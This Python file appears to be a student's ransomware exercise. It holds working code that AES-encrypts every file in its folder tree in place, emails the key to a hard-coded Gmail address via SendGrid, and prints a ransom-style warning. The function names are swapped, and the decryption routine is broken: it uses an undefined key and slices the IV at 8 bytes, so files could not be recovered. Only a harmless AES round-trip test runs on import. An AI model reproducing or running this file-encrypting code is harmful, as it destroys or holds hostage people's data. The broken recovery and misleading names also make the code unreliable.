import base64
import os
import json
from base64 import b64encode
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Random import get_random_bytes
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail


def send_email(key):
    message = Mail(
        from_email='yargoryar@gmail.com',
        to_emails='yaryna.gorodietska@gmail.com',
        subject='b64_key',
        html_content=key
    )

    sg = SendGridAPIClient(os.environ.get('SENDGRID_API_KEY'))
    response = sg.send(message)

def decrypt():
    key=get_random_bytes(24)
    b64_key=base64.b64encode(key).decode()
    ransomware_path=os.path.realpath(__file__)
    folder_path=os.path.dirname(os.path.abspath(__file__))
    for root,dirs,files in os.walk(folder_path):
        for a_file in files:
            full_file_path=f"{root}\\{a_file}"
            if full_file_path != ransomware_path:
                file=open(full_file_path,"rb")
                data=file.read()
                file.close()
                file=open(full_file_path,"wb")
                cipher=AES.new(key,AES.MODE_OFB)
                encr=cipher.encrypt(data)
                e_data=cipher.iv
                e_data+=encr
                file.write(e_data)
                file.close()
    send_email(b64_key)
    print("Warning!")
    print(f"Your files in {folder_path} and it's subfolders have been encrypted!")



def encrypt():
    # ui_key = input("Enter a key to decrypt all of the files:")
    # TODO: uncomment before send
    dkey=base64.b64decode(key)
    #TODO: change key by ui_key after uncomment
    ransomware_path = os.path.realpath(__file__)
    folder_path = os.path.dirname(os.path.abspath(__file__))
    for root,dirs,files in os.walk(folder_path):
        for a_file in files:
            full_file_path=f"{root}\\{a_file}"
            if full_file_path != ransomware_path:
                file=open(full_file_path,"rb")
                e_data=file.read()
                file.close()
                file=open(full_file_path,"wb")
                d_cipher=AES.new(dkey,AES.MODE_OFB)
                decr=d_cipher.decrypt(e_data[8:])
                file.write(decr)
                file.close()
    print(f"Your files in {folder_path} and it's subfolders have been decrypted!")


def test_encryption_on_one_word():
    # data = b"Yaryna"
    # print(f"We want to encrypt data:{data}")
    # key = get_random_bytes(16)
    # cipher = AES.new(key, AES.MODE_OFB)
    # encr = cipher.encrypt(data)
    # print(f"Our data has been encrypted:{encr}")
    # d_cipher = AES.new(key, AES.MODE_OFB)
    # decr = d_cipher.decrypt(encr)
    # print(f"Our data has been decrypted:{decr}")

    data = b"secret"
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_OFB)
    ct_bytes = cipher.encrypt(data)
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    result = json.dumps({'iv': iv, 'ciphertext': ct})
    print(result)
    try:
        b64 = json.loads(result)
        iv = b64decode(b64['iv'])
        ct = b64decode(b64['ciphertext'])
        cipher = AES.new(key, AES.MODE_OFB, iv=iv)
        pt = cipher.decrypt(ct)
        print("The message was: ", pt)
    except (ValueError, KeyError):
        print("Incorrect decryption")


test_encryption_on_one_word()
